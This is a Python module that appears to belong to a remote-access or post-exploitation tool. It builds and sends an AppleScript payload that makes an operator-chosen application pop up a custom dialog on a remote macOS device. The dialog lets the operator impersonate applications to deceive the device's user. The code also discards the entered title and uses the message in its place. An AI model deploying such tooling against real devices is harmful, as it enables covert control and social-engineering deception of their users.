import time
import json
import modules.helper as h

class command:
    def __init__(self):
        self.name = "alert"
        self.description = "Make alert show up on device."
        self.type = "applescript"

    def run(self,session,cmd_data):
        title = raw_input(h.CYAN+"[*]"+h.WHITE+" Alert Title: ")
        message = raw_input(h.CYAN+"[*]"+h.WHITE+" Alert Message: ")
        icon = raw_input(h.CYAN+"[*]"+h.WHITE+" Alert Icon: ")
        application = raw_input(h.CYAN+"[*]"+h.WHITE+" Alert Application: ")
        fbutton = raw_input(h.CYAN+"[*]"+h.WHITE+" First button: ")
        sbutton = raw_input(h.CYAN+"[*]"+h.WHITE+" Second button: ")
        one = '"'
        payload = """
        tell application """+one+""""""+application+""""""+one+"""
            activate
            
                try
                    display dialog """+one+""""""+message+""""""+one+""" with icon """+icon+""" with title """+one+""""""+message+""""""+one+""" buttons {"""+one+""""""+fbutton+""""""+one+""", """+one+""""""+sbutton+""""""+one+"""} default button """+one+""""""+fbutton+""""""+one+""" cancel button """+one+""""""+sbutton+""""""+one+"""
                end try
                        
        end tell        
        """
        cmd_data.update({"cmd":"applescript","args":payload})
        alert = session.send_command(cmd_data).strip()
        return ""